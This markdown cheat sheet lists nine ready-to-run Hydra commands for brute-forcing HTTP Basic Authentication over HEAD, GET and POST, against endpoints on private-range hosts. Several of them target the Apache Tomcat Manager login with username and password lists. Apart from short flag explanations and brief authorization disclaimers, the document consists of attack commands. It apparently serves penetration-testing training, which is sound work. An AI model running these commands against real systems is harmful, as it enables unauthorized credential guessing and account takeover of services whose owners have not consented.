# 💥 **Hydra HTTP Basic Authentication Brute Force**

This document outlines several **Hydra** commands used for brute-forcing HTTP Basic Authentication through different methods like `HEAD`, `GET`, and `POST`. These examples perform brute-force attacks to guess username-password combinations.

⚠️ **Important:** Ensure that you have explicit permission to run these commands against the target system.

---

### 1️⃣ **Basic HTTP Authentication (HEAD Method)**  
This command performs a brute-force attack on HTTP Basic Authentication by sending `HEAD` requests to the `/test` endpoint at `192.168.1.40`. It uses usernames from `/opt/user.txt` and passwords from `/opt/password.txt`.

```bash
hydra -L /opt/user.txt -P /opt/password.txt 192.168.1.40 http-head "/test"
```

---

### 2️⃣ **HTTP Authentication on Port 8080 with Stop on First Success**  
This is similar to the previous command but targets port `8080` using `-s 8080`. The `-f` flag ensures that Hydra stops after finding the first valid username-password pair.

```bash
hydra -L /opt/user.txt -P /opt/password.txt -s 8080 -f 192.168.1.40 http-head "/test"
```

---

### 3️⃣ **HTTP GET Method on Port 8080**  
This command performs a brute force attack using the HTTP `GET` method. It sends requests to the `/test` endpoint on port `8080`, attempting authentication with credentials from `/opt/user.txt` and `/opt/password.txt`.

```bash
hydra -L /opt/user.txt -P /opt/password.txt -s 8080 -f 192.168.1.40 http-get "/test"
```

---

### 4️⃣ **HTTP GET Request in URL Format**  
A variant of the previous command, formatted in URL style. It uses the HTTP `GET` method to attempt brute-forcing authentication at the `/test` endpoint of `192.168.1.40`.

```bash
hydra -L /opt/user.txt -P /opt/password.txt http-get://192.168.1.40/test
```

---

### 5️⃣ **HTTP POST Method**  
This command sends `POST` requests to the `/test` endpoint, suitable for forms or services requiring `POST` for authentication. It attempts brute-forcing credentials from `/opt/user.txt` and `/opt/password.txt`.

```bash
hydra -L /opt/user.txt -P /opt/password.txt http-post://192.168.1.40/test
```

---

### 6️⃣ **Apache Tomcat Brute Force (HTTP GET)**  
This command performs brute-forcing against the Apache Tomcat Manager on port `8080` using HTTP `GET` requests. It uses the usernames from `apache_tomcat_users.txt` and passwords from `apache_tomcat_passwords.txt`.

```bash
hydra -L apache_tomcat_users.txt -P apache_tomcat_passwords.txt -s 8080 -f 192.168.1.203 http-get /manager
```

---

### 7️⃣ **Apache Tomcat Brute Force (HTTP HEAD Method)**  
This command uses the `HEAD` method to attempt brute-forcing the Apache Tomcat Manager located at `192.168.1.203` on port `8080`.

```bash
hydra -L apache_tomcat_users.txt -P apache_tomcat_passwords.txt http-head://192.168.1.203:8080/manager
```

---

### 8️⃣ **Apache Tomcat Brute Force (HEAD on /manager)**  
This command sends `HEAD` requests to the `/manager` path on Apache Tomcat Manager at `192.168.1.203` on port `8080`. It attempts brute-forcing authentication on this specific path.

```bash
hydra -L apache_tomcat_users.txt -P apache_tomcat_passwords.txt -s 8080 192.168.1.203 http-head "/manager"
```

---

### 9️⃣ **Single Username (tomcat) and Password List**  
This command uses a fixed username (`tomcat`) and brute-forces the password list `apache_tomcat_passwords.txt` against the `/manager/html` path on the Apache Tomcat Manager at `192.168.1.203` on port `8080`.

```bash
hydra -l tomcat -P apache_tomcat_passwords.txt -s 8080 192.168.1.203 http-head "/manager/html"
```

---

### 📌 **Notes:**

- `-L`: **Path to the list of usernames**  
- `-P`: **Path to the list of passwords**  
- `-s`: **Specifies the port**  
- `-f`: **Stops Hydra after the first valid pair is found**  
- ⚠️ **Always use responsibly and with authorization**  
